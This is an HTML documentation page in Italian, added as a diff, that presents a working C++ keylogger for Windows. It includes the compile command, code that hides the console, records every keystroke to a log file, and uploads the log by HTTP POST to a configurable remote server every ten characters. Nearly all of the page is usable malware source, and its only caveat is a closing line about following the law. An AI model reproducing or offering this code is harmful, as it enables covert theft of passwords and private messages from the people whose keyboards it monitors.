@@ -1,0 +1,207 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Documentazione: Keylogger in C++</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            margin: 0;
+            padding: 20px;
+            background-color: #f4f4f4;
+            line-height: 1.6;
+        }
+        h1, h2, h3 {
+            color: #333;
+        }
+        code {
+            background-color: #272822;
+            color: #f8f8f2;
+            border: 1px solid #ddd;
+            padding: 5px;
+            display: block;
+            white-space: pre-wrap;
+            margin-bottom: 20px;
+        }
+        pre {
+            background-color: #f9f9f9;
+            padding: 10px;
+            border-radius: 5px;
+            border: 1px solid #ddd;
+        }
+        .container {
+            max-width: 900px;
+            margin: auto;
+            background: #fff;
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+        }
+        .code-block {
+            background-color: #272822;
+            color: #f8f8f2;
+            padding: 15px;
+            border-radius: 5px;
+            font-family: "Courier New", Courier, monospace;
+            overflow-x: auto;
+        }
+        .command {
+            background-color: #e7f3ff;
+            border-left: 5px solid #2196F3;
+            padding: 10px;
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="container">
+    <h1>Documentazione: Keylogger in C++</h1>
+
+    <p>Questo programma implementa un <strong>keylogger</strong> che registra i tasti premuti dall'utente e carica i log su un server remoto tramite una richiesta HTTP POST. Utilizza le API di Windows per nascondere la console e gestire l'acquisizione dei tasti.</p>
+
+    <h2>Compilazione</h2>
+    <div class="command">
+        Puoi compilare questo programma utilizzando <strong>g++</strong> con i seguenti parametri di compilazione:
+        <pre>g++ -m32 -O2 -static-libgcc -static-libstdc++ -o keylogger.exe keylogger.cpp -mwindows -lwininet</pre>
+    </div>
+
+    <ul>
+        <li><strong>-m32</strong>: Compila a 32 bit.</li>
+        <li><strong>-O2</strong>: Ottimizza il codice.</li>
+        <li><strong>-static-libgcc -static-libstdc++</strong>: Collega staticamente le librerie per la portabilità.</li>
+        <li><strong>-mwindows</strong>: Nasconde la finestra della console al momento dell'esecuzione.</li>
+        <li><strong>-lwininet</strong>: Collega la libreria <strong>WinINet</strong> necessaria per le comunicazioni HTTP.</li>
+    </ul>
+
+    <h2>Descrizione del Codice</h2>
+
+    <h3>Costanti Globali</h3>
+    <p>Le seguenti variabili definiscono l'indirizzo del server e il percorso per il file di log:</p>
+    <div class="code-block">
+        <code>string address = "localhost";<br>
+        string page = "/upload.php";<br>
+        string fileName = "log.txt";</code>
+    </div>
+
+    <h3>Funzione <code>main</code></h3>
+    <p>La funzione principale esegue i seguenti passaggi:</p>
+    <ul>
+        <li><strong>Nascondere la finestra della console</strong>: Usa <code>ShowWindow()</code> per nascondere la finestra della console.</li>
+        <li><strong>Ciclo infinito</strong>: Registra i tasti premuti e li scrive in un file di log, quindi invia il file al server ogni dieci caratteri.</li>
+    </ul>
+    <pre class="code-block">
+        <code>int main() {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;ofstream file;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;int counter = 0;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;const int sendToNChars = 10;<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;HWND hwnd = GetConsoleWindow();<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;ShowWindow(hwnd, SW_HIDE);<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;file.open(fileName, ofstream::app);<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;while(true) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;for(char c = 8; c<222; c++) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(GetAsyncKeyState(c) & 0x0001) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file << c;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;file.flush();<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;if(counter == sendToNChars) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;counter = 0;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;SendLogFile(address, page, fileName);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;} else {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;counter++;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Sleep(10);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;file.close();<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;return 0;<br>
+        }</code>
+    </pre>
+
+    <h3>Funzione <code>SendLogFile</code></h3>
+    <p>Questa funzione invia il file di log al server tramite una richiesta HTTP POST.</p>
+    <pre class="code-block">
+        <code>bool SendLogFile(const string& server, const string& path, const string& logfile) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;const string boundary = "----WebKitFormBoundary7MA4YWxkTrZu0gW";<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;const string end_boundary = "--" + boundary + "--";<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;string headers = "Content-Type: multipart/form-data; boundary=" + boundary + "\r\n";<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;HINTERNET hInternet = InternetOpenW(L"M#TE", INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;if (!hInternet) return false;<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;HINTERNET hConnect = InternetConnectW(hInternet, wstring(server.begin(), server.end()).c_str(),<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;INTERNET_DEFAULT_HTTP_PORT, NULL, NULL, INTERNET_SERVICE_HTTP, 0, 0);<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;if (!hConnect) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InternetCloseHandle(hInternet);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;HINTERNET hRequest = HttpOpenRequestW(hConnect, L"POST", wstring(path.begin(), path.end()).c_str(),<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;NULL, NULL, NULL, 0, 0);<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;if (!hRequest) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InternetCloseHandle(hConnect);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InternetCloseHandle(hInternet);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;ifstream file(logfile, ios::in | ios::binary);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;if (!file) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InternetCloseHandle(hRequest);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InternetCloseHandle(hConnect);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;InternetCloseHandle(hInternet);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;return false;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;}<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;ostringstream oss;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;oss << file.rdbuf();<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;string fileContent = oss.str();<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;ostringstream requestBody;<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;requestBody << "--" << boundary << "\r\n";<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;requestBody << "Content-Disposition: form-data; name=\"uploaded_file\"; filename=\"logfile.txt\"\r\n";<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;requestBody << "Content-Type: application/octet-stream\r\n\r\n";<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;requestBody << fileContent << "\r\n";<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;requestBody << end_boundary;<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;std::string body = requestBody.str();<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;BOOL bResults = HttpSendRequestW(hRequest, ConvertToWide(headers).c_str(), -1L, (LPVOID)body.c_str(), body.size());<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;file.close();<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;InternetCloseHandle(hRequest);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;InternetCloseHandle(hConnect);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;InternetCloseHandle(hInternet);<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;return bResults;<br>
+        }</code>
+    </pre>
+
+    <h3>Funzione <code>ConvertToWide</code></h3>
+    <p>Converte una stringa normale in una wide string per l'uso con le API di Windows:</p>
+    <pre class="code-block">
+        <code>wstring ConvertToWide(const string& str) {<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;int len = MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, NULL, 0);<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;wstring wideStr(len, L'\0');<br>
+        &nbsp;&nbsp;&nbsp;&nbsp;MultiByteToWideChar(CP_ACP, 0, str.c_str(), -1, &wideStr[0], len);<br>
+        <br>
+        &nbsp;&nbsp;&nbsp;&nbsp;return wideStr;<br>
+        }</code>
+    </pre>
+
+    <h2>Considerazioni Finali</h2>
+    <p>Questo keylogger utilizza funzioni delle API di Windows per raccogliere input da tastiera in modo invisibile. È importante notare che l'uso di software di questo tipo deve essere sempre conforme alle leggi locali e rispettare la privacy degli utenti.</p>
+
+</div>
+
+</body>
+</html>
